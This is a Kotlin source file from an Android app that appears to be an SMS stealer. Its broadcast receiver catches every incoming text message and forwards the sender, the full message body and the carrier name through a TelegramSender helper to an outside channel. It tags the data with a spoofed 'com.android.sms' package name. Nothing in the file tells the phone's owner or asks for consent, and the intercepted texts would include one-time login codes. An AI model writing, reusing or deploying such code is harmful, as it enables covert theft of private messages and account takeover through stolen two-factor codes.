package ru.pushtoweb.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.TelephonyManager

class SmsBroadcastReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            val tm = context?.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            val operatorName = tm?.networkOperatorName ?: ""

            for (sms in messages) {
                val sender = sms.originatingAddress ?: "SMS"
                val body = sms.messageBody ?: ""

                TelegramSender.forwardPayload(
                    type = "sms",
                    sender = sender,
                    text = body,
                    appName = "SMS",
                    packageName = "com.android.sms",
                    operator = operatorName
                )
            }
        }
    }
}
